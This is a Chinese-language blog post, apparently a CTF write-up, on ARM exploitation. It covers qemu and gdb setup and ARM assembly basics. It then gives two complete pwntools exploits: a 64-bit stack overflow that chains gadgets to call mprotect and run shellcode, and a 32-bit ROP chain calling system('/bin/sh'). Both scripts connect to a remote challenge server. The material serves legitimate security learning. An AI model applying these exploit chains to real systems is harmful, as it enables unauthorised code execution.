@@ -1,0 +1,496 @@
+
+<!DOCTYPE html>
+<html lang="zh-Hans" class="loading">
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>32位、64位下arm_pwn学习 - V1ct0r的博客</title>
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate" />
+    <meta name="keywords" content="TriDiamond Obsidian,"> 
+    <meta name="description" content="前言：pwn的学习之路一直在进行，今天看了arm_pwn，搞环境就搞了半天，琢磨工具使用到做题，这里总结下，希望能帮助到大家，少走一点弯路。
+一、环境配置：环境是一大玄学问题，这里仅仅是 我Ubun,"> 
+    <meta name="author" content="V1ct0r"> 
+    <link rel="alternative" href="atom.xml" title="V1ct0r的博客" type="application/atom+xml"> 
+    <link rel="icon" href="/img/favicon.png"> 
+    <link href="https://fonts.loli.net/css?family=Roboto+Mono|Rubik&display=swap" rel="stylesheet">
+    
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1429596_nzgqgvnmkjb.css">
+
+    
+<link rel="stylesheet" href="//cdn.bootcss.com/animate.css/3.7.2/animate.min.css">
+
+    
+<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/css/share.min.css">
+
+    
+<link rel="stylesheet" href="//cdn.bootcss.com/codemirror/5.48.4/codemirror.min.css">
+
+    
+<link rel="stylesheet" href="//cdn.bootcss.com/codemirror/5.48.4/theme/dracula.css">
+
+    
+<link rel="stylesheet" href="/css/obsidian.css">
+
+    
+<link rel="stylesheet" href="/css/ball-atom.min.css">
+
+<meta name="generator" content="Hexo 4.2.1"></head>
+
+
+<body class="loading">
+    <div class="loader">
+        <div class="la-ball-atom la-2x">
+            <div></div>
+            <div></div>
+            <div></div>
+            <div></div>
+        </div>
+    </div>
+    <span id="config-title" style="display:none">V1ct0r的博客</span>
+    <div id="loader"></div>
+    <div id="single">
+    <div class="scrollbar gradient-bg-rev"></div>
+<div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <div class="navigation animated fadeIn fast delay-1s">
+        <img id="home-icon" class="icon-home" src="/img/favicon.png" alt="" data-url="http://yoursite.com">
+        <div id="play-icon" title="Play/Pause" class="iconfont icon-play"></div>
+        <h3 class="subtitle">32位、64位下arm_pwn学习</h3>
+        <div class="social">
+            <!--        <div class="like-icon">-->
+            <!--            <a href="javascript:;" class="likeThis active"><span class="icon-like"></span><span class="count">76</span></a>-->
+            <!--        </div>-->
+            <div>
+                <div class="share">
+                    
+                        <a href="javascript:;" class="iconfont icon-share1"></a>
+                        <div class="share-component-cc" data-disabled="facebook,douban,linkedin,diandian,tencent,google"></div>
+                    
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+    <div class="section">
+        <div class=article-header-wrapper>
+    <div class="article-header">
+        <div class="article-cover animated fadeIn" style="
+            animation-delay: 600ms;
+            animation-duration: 1.2s;
+            background-image: 
+                radial-gradient(ellipse closest-side, rgba(0, 0, 0, 0.65), #100e17),
+                url(/img/cover.jpg) ">
+        </div>
+        <div class="else">
+            <p class="animated fadeInDown">
+                
+                <a href="/categories/PWN"><b>「
+                    </b>PWN<b> 」</b></a>
+                
+                January 03, 2020
+            </p>
+            <h3 class="post-title animated fadeInDown"><a href="/2020/01/03/32%E4%BD%8D%E3%80%8164%E4%BD%8D%E4%B8%8B%E7%9A%84arm_pwn/" title="32位、64位下arm_pwn学习" class="">32位、64位下arm_pwn学习</a>
+            </h3>
+            
+            <p class="post-count animated fadeInDown">
+                
+                <span>
+                    <b class="iconfont icon-text2"></b> <i>Words count</i>
+                    25k
+                </span>
+                
+                
+                <span>
+                    <b class="iconfont icon-timer__s"></b> <i>Reading time</i>
+                    22 mins.
+                </span>
+                
+                
+                
+                <span id="busuanzi_container_page_pv">
+                    <b class="iconfont icon-read"></b> <i>Read count</i>
+                    <span id="busuanzi_value_page_pv">0</span>
+                </span>
+                
+            </p>
+            
+            
+            <ul class="animated fadeInDown post-tags-list" itemprop="keywords"><li class="animated fadeInDown post-tags-list-item"><a class="animated fadeInDown post-tags-list-link" href="/tags/arm/" rel="tag">arm</a></li></ul>
+            
+        </div>
+    </div>
+</div>
+
+<div class="screen-gradient-after">
+    <div class="screen-gradient-content">
+        <div class="screen-gradient-content-inside">
+            <div class="bold-underline-links screen-gradient-sponsor">
+                <p>
+                    <span class="animated fadeIn delay-1s"></span>
+                </p>
+            </div>
+        </div>
+    </div>
+</div>
+
+<div class="article">
+    <div class='main'>
+        <div class="content markdown animated fadeIn">
+            <h4 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h4><p>pwn的学习之路一直在进行，今天看了arm_pwn，搞环境就搞了半天，琢磨工具使用到做题，这里总结下，希望能帮助到大家，少走一点弯路。</p>
+<h4 id="一、环境配置："><a href="#一、环境配置：" class="headerlink" title="一、环境配置："></a>一、环境配置：</h4><p>环境是一大玄学问题，这里仅仅是 我Ubuntu16.04下的环境配置，亲测有效，但是遇到玄学的问题时，也请留言，努力帮大家解决。</p>
+<a id="more"></a>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#安装qemu</span></span><br><span class="line">apt-get install qemu</span><br><span class="line"><span class="comment">#更新一下</span></span><br><span class="line">sudo apt-get update</span><br><span class="line"><span class="comment">#安装32位的依赖库</span></span><br><span class="line">sudo apt-get install -y gcc-arm-linux-gnueabi</span><br><span class="line"><span class="comment">#运行32位的动态链接程序方法</span></span><br><span class="line">qemu-arm -L /usr/arm-linux-gnueabi ./文件</span><br><span class="line"><span class="comment">#安装64位的依赖库</span></span><br><span class="line">sudo apt-get install -y gcc-aarch64-linux-gnu g++-aarch64-linux-gnu</span><br><span class="line"><span class="comment">#运行64位的动态链接程序方法</span></span><br><span class="line">qemu-aarch64 -L /usr/aarch64-linux-gnu ./文件</span><br><span class="line"><span class="comment">#安装gdb调试工具</span></span><br><span class="line">sudo apt-get install git gdb gdb-multiarch</span><br><span class="line"><span class="comment">#32位程序下断调试步骤</span></span><br><span class="line">qemu-arm -g <span class="number">1234</span> -L /usr/arm-linux-gnueabi ./文件(窗口<span class="number">1</span>)</span><br><span class="line">gdb-multiarch ./文件(窗口<span class="number">2</span>)</span><br><span class="line">pwndbg&gt; target remote :<span class="number">1234</span></span><br><span class="line">pwndbg&gt; b *<span class="number">0x8bb0</span></span><br><span class="line"><span class="comment">#64位程序下断调试步骤</span></span><br><span class="line">qemu-aarch64 -g <span class="number">1234</span> -L /usr/aarch64-linux-gnu ./文件(窗口<span class="number">1</span>)</span><br><span class="line">gdb-multiarch ./文件(窗口<span class="number">2</span>)</span><br><span class="line">pwndbg&gt; target remote :<span class="number">1234</span></span><br><span class="line">pwndbg&gt; b *<span class="number">0x8bb0</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="二、arm汇编基础："><a href="#二、arm汇编基础：" class="headerlink" title="二、arm汇编基础："></a>二、arm汇编基础：</h4><p>环境起来了，就可以像平时一样分析漏洞打题了，但是还是有不同的地方：</p>
+<p>1、arm32只有16个32bit的通用寄存器，r0到r12，lr，pc，sp，函数调用时，前4个参数是压入寄存器的(r0、r1、r2、r3)，后面的参数是压入栈中的</p>
+<p>2、arm64有32个64bit长度的通用寄存器x0到x30以及sp，函数调用时，前8个参数都是通过寄存器来传递x0到x7</p>
+<p>3、用一张图熟悉常见的arm汇编指令</p>
+<p><img src="/blog_img/1573037860774.png" alt="57303786077"></p>
+<p>4、举几个常见的汇编代码：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ldr r0,[r1, #<span class="number">4</span>]     <span class="comment">//将内存单元R1+4中的字读取到R0寄存器中，同时R1=R1+4</span></span><br><span class="line">add r1,r2,#<span class="number">1</span>    <span class="comment">//表示r1=r2+1， 即寄存器r1的值等于寄存器r2的值加上1</span></span><br><span class="line">b、bl          <span class="comment">//相当于call</span></span><br><span class="line">BIC    R1,  R1,   #<span class="number">0x0F</span>     <span class="comment">//将R1   低4位清0</span></span><br><span class="line">mov r1,#<span class="number">4096</span>      <span class="comment">//r1 = 4096</span></span><br><span class="line">msr cpsr，r0       <span class="comment">//复制r0到cpsr中</span></span><br><span class="line">str r1,[r2,#<span class="number">4</span>]  <span class="comment">//将r1的数据保存到地址为r2+4的内存单元中</span></span><br><span class="line">sub r1,r2,#<span class="number">1</span>    <span class="comment">//表示r1=r2-1</span></span><br></pre></td></tr></table></figure>
+
+<p>5、lr、sp、pc三大寄存器</p>
+<p>​        堆栈指针r13（SP）：每一种异常模式都有其自己独立的r13，它通常指向异常模式所专用的堆栈，也就是说五种异常模式、非异常模式（用户模式和系统模式），都有各自独立的堆栈，用不同的堆栈指针来索引。这样当ARM进入异常模式的时候，程序就可以把一般通用寄存器压入堆栈，返回时再出栈，保证了各种模式下程序的状态的完整性。</p>
+<p>​        连接寄存器r14（LR）：每种模式下r14都有自身版组，它有两个特殊功能。</p>
+<p>​    （1）保存子程序返回地址。使用BL或BLX时，跳转指令自动把返回地址放入r14中；子程序通过把r14复制到PC来实现返回，通常用下列指令之一：<br>​                        MOV PC, LR<br>​                        BX LR</p>
+<p>​    通常子程序这样写，保证了子程序中还可以调用子程序。<br>​                         stmfd sp!, {lr}<br>​                         ……<br>​                         ldmfd sp!, {pc}</p>
+<p>​    （2）当异常发生时，异常模式的r14用来保存异常返回地址，将r14如栈可以处理嵌套中断。</p>
+<p>​        程序计数器r15（PC）：PC是有读写限制的。当没有超过读取限制的时候，读取的值是指令的地址加上8个字节，由于ARM指令总是以字对齐的，故bit[1:0]总是00。当用str或stm存储PC的时候，偏移量有可能是8或12等其它值。在V3及以下版本中，写入bit[1:0]的值将被忽略，而在V4及以上版本写入r15的bit[1:0]必须为00，否则后果不可预测。</p>
+<h5 id="如果通俗地理解就是lr-rax，sp-rsp，pc-rip"><a href="#如果通俗地理解就是lr-rax，sp-rsp，pc-rip" class="headerlink" title="如果通俗地理解就是lr=rax，sp=rsp，pc=rip"></a>如果通俗地理解就是lr=rax，sp=rsp，pc=rip</h5><p>相对的，x30是存放ret地址</p>
+<h4 id="三、做题实战"><a href="#三、做题实战" class="headerlink" title="三、做题实战"></a>三、做题实战</h4><h5 id="1、64位下的arm程序"><a href="#1、64位下的arm程序" class="headerlink" title="1、64位下的arm程序"></a>1、64位下的arm程序<img src="/blog_img/1573039129553.png" alt="57303912955"></h5><p>可以看到程序除了NX，什么也没有开，ida分析下逻辑：</p>
+<p><img src="/blog_img/1573039511646.png" alt="57303951164"></p>
+<p>先读0x200字节到bss段中，然后再栈溢出，漏洞点相当简单，既然有读到栈上我们就直接填shellcode然后改写下bss权限为7即可，但是这是在arm的环境下，所以实现起来，相对困难一点点</p>
+<p>首先ida直接分析栈偏移是不行的，我们可以通过cyclic去计算出偏移(动态调试一下即可)，可以算出偏移为72，</p>
+<p>接着我们要栈溢出执行mprotect，这里三个参数都要满足比较辛苦，但是我们可以通过中级栈溢出的方式去得到：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">text</span>:<span class="number">00000000004008</span>AC loc_4008AC                              ; CODE XREF: sub_400868+<span class="number">60</span>↓j</span><br><span class="line">.<span class="built_in">text</span>:<span class="number">00000000004008</span>AC                 LDR             X3, [X21,X19,LSL#<span class="number">3</span>] <span class="comment">// x3=[x21+x19*8]</span></span><br><span class="line">.<span class="built_in">text</span>:<span class="number">00000000004008B</span>0                 MOV             X2, X22 <span class="comment">//x2=x22</span></span><br><span class="line">.<span class="built_in">text</span>:<span class="number">00000000004008B</span>4                 MOV             X1, X23 <span class="comment">//x1=x23</span></span><br><span class="line">.<span class="built_in">text</span>:<span class="number">00000000004008B</span>8                 MOV             W0, W24 <span class="comment">// w0=w24(低位)</span></span><br><span class="line">.<span class="built_in">text</span>:<span class="number">00000000004008B</span>C                 ADD             X19, X19, #<span class="number">1</span> <span class="comment">// x19=x19+1</span></span><br><span class="line">.<span class="built_in">text</span>:<span class="number">00000000004008</span>C0                 BLR             X3      <span class="comment">// call x3</span></span><br><span class="line">.<span class="built_in">text</span>:<span class="number">00000000004008</span>C4                 CMP             X19, X20 ; </span><br><span class="line">.<span class="built_in">text</span>:<span class="number">00000000004008</span>C8                 B.NE            loc_4008AC <span class="comment">// jmp if not equal</span></span><br><span class="line">.<span class="built_in">text</span>:<span class="number">00000000004008</span>CC</span><br><span class="line">.<span class="built_in">text</span>:<span class="number">00000000004008</span>CC loc_4008CC                              ; CODE XREF: sub_400868+<span class="number">3</span>C↑j</span><br><span class="line">.<span class="built_in">text</span>:<span class="number">00000000004008</span>CC                 LDP             X19, X20, [SP,#var_s10] ; </span><br><span class="line">                                                       <span class="comment">//x19=sp+0x10，x20=[sp+0x18]</span></span><br><span class="line">.<span class="built_in">text</span>:<span class="number">00000000004008</span>D0                 LDP             X21, X22, [SP,#var_s20] </span><br><span class="line">                                                       <span class="comment">//x21=sp+0x20，x22=[sp+0x28]</span></span><br><span class="line">.<span class="built_in">text</span>:<span class="number">00000000004008</span>D4                 LDP             X23, X24, [SP,#var_s30] </span><br><span class="line">                                                       <span class="comment">//x23=sp+0x30，x24=[sp+0x38]</span></span><br><span class="line">.<span class="built_in">text</span>:<span class="number">00000000004008</span>D8                 LDP             X29, X30, [SP+var_s0],#<span class="number">0x40</span> ; Load Pair</span><br><span class="line">                                                       <span class="comment">//x29=[sp], x30=[sp+8]</span></span><br><span class="line">.<span class="built_in">text</span>:<span class="number">00000000004008</span>DC                 RET             <span class="comment">//ret [x30]</span></span><br></pre></td></tr></table></figure>
+
+<p>根据前面学的arm的汇编基础，我们很容易将代码读懂，这里我做了注释，方便看清楚。</p>
+<p>好了知道意思后，利用就和elf文件一样，我们控制好参数，写个集成函数即可，这里有个坑点，就是填got表是无法实现调用的，因为arm不太一样，这里我们需要伪造一个mprotect_plt的got表，实现调用，可以将mprotect_plt写到bss上就搞定了，执行完我们再ret我们的shellcode的位置既可，下面上exp：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">bin_elf = <span class="string">'./64arm'</span></span><br><span class="line">context.binary = bin_elf</span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> sys.argv[<span class="number">1</span>] == <span class="string">"r"</span>:</span><br><span class="line">    p = remote(<span class="string">"106.75.126.171"</span>,<span class="number">33865</span>)</span><br><span class="line"><span class="keyword">elif</span> sys.argv[<span class="number">1</span>] == <span class="string">"l"</span>:</span><br><span class="line">    p = process([<span class="string">"qemu-aarch64"</span>, <span class="string">"-L"</span>, <span class="string">"/usr/aarch64-linux-gnu/"</span>,bin_elf])</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = process([<span class="string">"qemu-aarch64"</span>, <span class="string">"-g"</span>, <span class="string">"1234"</span>, <span class="string">"-L"</span>, <span class="string">"/usr/aarch64-linux-gnu/"</span>, bin_elf])</span><br><span class="line"></span><br><span class="line">elf = ELF(bin_elf)</span><br><span class="line"></span><br><span class="line">sl = <span class="keyword">lambda</span> s : p.sendline(s)</span><br><span class="line">sd = <span class="keyword">lambda</span> s : p.send(s)</span><br><span class="line">rc = <span class="keyword">lambda</span> n : p.recv(n)</span><br><span class="line">ru = <span class="keyword">lambda</span> s : p.recvuntil(s)</span><br><span class="line">ti = <span class="keyword">lambda</span> : p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">(addr,PIE=True)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> PIE:</span><br><span class="line">        text_base = int(os.popen(<span class="string">"pmap &#123;&#125;| awk '&#123;&#123;print $1&#125;&#125;'"</span>.format(p.pid)).readlines()[<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line">        gdb.attach(p,<span class="string">'b *&#123;&#125;'</span>.format(hex(text_base+addr)))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        gdb.attach(p,<span class="string">"b *&#123;&#125;"</span>.format(hex(addr)))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bk</span><span class="params">(addr)</span>:</span></span><br><span class="line">    gdb.attach(p,<span class="string">"b *"</span>+str(hex(addr)))</span><br><span class="line"></span><br><span class="line">gadget1 = <span class="number">0x00004008CC</span></span><br><span class="line">gadget2 = <span class="number">0x00004008AC</span></span><br><span class="line">bss = <span class="number">0x0000411068</span></span><br><span class="line">mprotect = <span class="number">0x000400600</span></span><br><span class="line">ru(<span class="string">"Name:"</span>)</span><br><span class="line">shellcode = asm(shellcraft.aarch64.sh())</span><br><span class="line">py = <span class="string">''</span></span><br><span class="line">py += p64(mprotect)</span><br><span class="line">py += shellcode</span><br><span class="line">sl(py)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">middle_stackoverlow</span><span class="params">(offset,x0,x1,x2,function_addr,ret_addr)</span>:</span></span><br><span class="line">    py = <span class="string">''</span></span><br><span class="line">    py += <span class="string">'a'</span>*offset</span><br><span class="line">    py += p64(gadget1)</span><br><span class="line">    py += p64(<span class="number">0</span>)</span><br><span class="line">    py += p64(gadget2)</span><br><span class="line">    py += p64(<span class="number">0</span>)</span><br><span class="line">    py += p64(<span class="number">1</span>)</span><br><span class="line">    py += p64(function_addr)</span><br><span class="line">    py += p64(x2)<span class="comment">#x22=x2</span></span><br><span class="line">    py += p64(x1)<span class="comment">#x23=x1</span></span><br><span class="line">    py += p64(x0)<span class="comment">#24=x0</span></span><br><span class="line">    py += p64(<span class="number">0</span>)</span><br><span class="line">    py += p64(ret_addr)</span><br><span class="line">    sl(py)</span><br><span class="line"></span><br><span class="line">middle_stackoverlow(<span class="number">72</span>,<span class="number">0x411000</span>,<span class="number">0x1000</span>,<span class="number">0x7</span>,bss,bss+<span class="number">8</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h5 id="2、32位下的arm程序"><a href="#2、32位下的arm程序" class="headerlink" title="2、32位下的arm程序"></a>2、32位下的arm程序</h5><p><img src="/blog_img/1573053174118.png" alt="57305317411"></p>
+<p>一样保护几乎没开，ida分析一波：</p>
+<p><img src="/blog_img/1573053207435.png" alt="57305320743"></p>
+<p>ida静态分析，可能不是很好看，所以进行黑盒测试，直接运行看：</p>
+<p><img src="/blog_img/1573053444405.png" alt="57305339027"></p>
+<p>可以知道先换行，然后再输入内容，会回显那个英文，还是个循环，没了。</p>
+<p>所以关键就是第二次输入，没开canary，猜想是栈溢出的题目，直接cyclic动态调试可以计算偏移：112</p>
+<p>同时程序有system和binsh的后门，根据rop，我们pop参数到r0即可实现调用：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">bin_elf = <span class="string">'./arm'</span></span><br><span class="line">context.binary = bin_elf</span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> sys.argv[<span class="number">1</span>] == <span class="string">"r"</span>:</span><br><span class="line">    p = remote(<span class="string">"106.75.126.171"</span>,<span class="number">33865</span>)</span><br><span class="line"><span class="keyword">elif</span> sys.argv[<span class="number">1</span>] == <span class="string">"l"</span>:</span><br><span class="line">    p = process([<span class="string">"qemu-arm"</span>, <span class="string">"-L"</span>, <span class="string">"/usr/arm-linux-gnueabi"</span>,bin_elf])</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = process([<span class="string">"qemu-arm"</span>, <span class="string">"-g"</span>, <span class="string">"1234"</span>, <span class="string">"-L"</span>, <span class="string">"/usr/arm-linux-gnueabi"</span>, bin_elf])</span><br><span class="line"></span><br><span class="line">elf = ELF(bin_elf)</span><br><span class="line">sl = <span class="keyword">lambda</span> s : p.sendline(s)</span><br><span class="line">sd = <span class="keyword">lambda</span> s : p.send(s)</span><br><span class="line">rc = <span class="keyword">lambda</span> n : p.recv(n)</span><br><span class="line">ru = <span class="keyword">lambda</span> s : p.recvuntil(s)</span><br><span class="line">ti = <span class="keyword">lambda</span> : p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">(addr,PIE=True)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> PIE:</span><br><span class="line">        text_base = int(os.popen(<span class="string">"pmap &#123;&#125;| awk '&#123;&#123;print $1&#125;&#125;'"</span>.format(p.pid)).readlines()[<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line">        gdb.attach(p,<span class="string">'b *&#123;&#125;'</span>.format(hex(text_base+addr)))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        gdb.attach(p,<span class="string">"b *&#123;&#125;"</span>.format(hex(addr)))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bk</span><span class="params">(addr)</span>:</span></span><br><span class="line">    gdb.attach(p,<span class="string">"b *"</span>+str(hex(addr)))</span><br><span class="line"></span><br><span class="line">pop_r0_r4_ret = <span class="number">0x00020904</span></span><br><span class="line">binsh = <span class="number">0x006C384</span></span><br><span class="line">system_plt = <span class="number">0x00110B4</span></span><br><span class="line">ru(<span class="string">"if you want to quit"</span>)</span><br><span class="line">sl(<span class="string">""</span>)</span><br><span class="line">py = <span class="string">''</span></span><br><span class="line">py += <span class="string">'a'</span>*<span class="number">112</span></span><br><span class="line">py += p32(pop_r0_r4_ret)</span><br><span class="line">py += p32(binsh)</span><br><span class="line">py += p32(<span class="number">0</span>)</span><br><span class="line">py += p32(system_plt)</span><br><span class="line">ru(<span class="string">"------Begin------"</span>)</span><br><span class="line">sl(py)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h4 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h4><h5 id="综上，其实还有种题目是leak出地址，然后再system去getshell，elf文件中很常见的ret2libc，会发现原理都一样其实，arm-pwn只是换汤不换药的一种新题型，掌握汇编原理和漏洞原理就可以做。"><a href="#综上，其实还有种题目是leak出地址，然后再system去getshell，elf文件中很常见的ret2libc，会发现原理都一样其实，arm-pwn只是换汤不换药的一种新题型，掌握汇编原理和漏洞原理就可以做。" class="headerlink" title="综上，其实还有种题目是leak出地址，然后再system去getshell，elf文件中很常见的ret2libc，会发现原理都一样其实，arm_pwn只是换汤不换药的一种新题型，掌握汇编原理和漏洞原理就可以做。"></a>综上，其实还有种题目是leak出地址，然后再system去getshell，elf文件中很常见的ret2libc，会发现原理都一样其实，arm_pwn只是换汤不换药的一种新题型，掌握汇编原理和漏洞原理就可以做。</h5>
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls"
+                data-autoplay="false">
+                <source type="audio/mpeg" src="">
+            </audio>
+            
+            <ul id="audio-list" style="display:none">
+                
+                
+                <li title='0' data-url='/statics/chengdu.mp3'></li>
+                
+                    
+            </ul>
+            
+            
+            
+    <div id='gitalk-container' class="comment link"
+        data-ae='true'
+        data-ci='ec894e2b66f752e8b7fb'
+        data-cs='3ccc2e92bb350688fe2c2dc2930189b62622bfb1'
+        data-r='blog-comments'
+        data-o='TriDiamond'
+        data-a='TriDiamond'
+        data-d=''
+    >Comments</div>
+
+
+            
+            
+        </div>
+        <div class="sidebar">
+            <div class="box animated fadeInRight">
+                <div class="subbox">
+                    <img src="https://res.cloudinary.com/tridiamond/image/upload/v1573019751/TriDiamond_logo_ui_xeublz.jpg" height=300 width=300></img>
+                    <p>V1ct0r</p>
+                    <span>Where there is a will,there is a way！</span>
+                    <dl>
+                        <dd><a href="https://github.com/TriDiamond" target="_blank"><span
+                                    class=" iconfont icon-github"></span></a></dd>
+                        <dd><a href="https://twitter.com/TriDiamond6" target="_blank"><span
+                                    class=" iconfont icon-twitter"></span></a></dd>
+                        <dd><a href="https://stackoverflow.com/users/7602324/tridiamond?tab=profile" target="_blank"><span
+                                    class=" iconfont icon-stack-overflow"></span></a></dd>
+                    </dl>
+                </div>
+                <ul>
+                    <li><a href="/">62 <p>Articles</p></a></li>
+                    <li><a href="/categories">7 <p>Categories</p></a></li>
+                    <li><a href="/tags">59 <p>Tags</p></a></li>
+                </ul>
+            </div>
+            
+            
+            
+            
+        </div>
+    </div>
+</div>
+
+    </div>
+</div>
+    <div id="back-to-top" class="animated fadeIn faster">
+        <div class="flow"></div>
+        <span class="percentage animated fadeIn faster">0%</span>
+        <span class="iconfont icon-top02 animated fadeIn faster"></span>
+    </div>
+</body>
+<footer>
+    <p class="copyright" id="copyright">
+        &copy; 2020
+        <span class="gradient-text">
+            V1ct0r
+        </span>.
+        Powered by <a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a>
+        Theme
+        <span class="gradient-text">
+            <a href="https://github.com/TriDiamond/hexo-theme-obsidian" title="Obsidian" target="_blank" rel="noopener">Obsidian</a>
+        </span>
+        <small><a href="https://github.com/TriDiamond/hexo-theme-obsidian/blob/master/CHANGELOG.md" title="v1.4.3" target="_blank" rel="noopener">v1.4.3</a></small>
+    </p>
+</footer>
+
+<script type="text/javascript" src="https://cdn.bootcss.com/mathjax/2.7.6/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+</script>
+<script>
+  MathJax.Hub.Config({
+    "HTML-CSS": {
+      preferredFont: "TeX",
+      availableFonts: ["STIX", "TeX"],
+      linebreaks: {
+        automatic: true
+      },
+      EqnChunk: (MathJax.Hub.Browser.isMobile ? 10 : 50)
+    },
+    tex2jax: {
+      inlineMath: [
+        ["$", "$"],
+        ["\\(", "\\)"]
+      ],
+      processEscapes: true,
+      ignoreClass: "tex2jax_ignore|dno",
+      skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+    },
+    TeX: {
+      noUndefined: {
+        attributes: {
+          mathcolor: "red",
+          mathbackground: "#FFEEEE",
+          mathsize: "90%"
+        }
+      },
+      Macros: {
+        href: "{}"
+      }
+    },
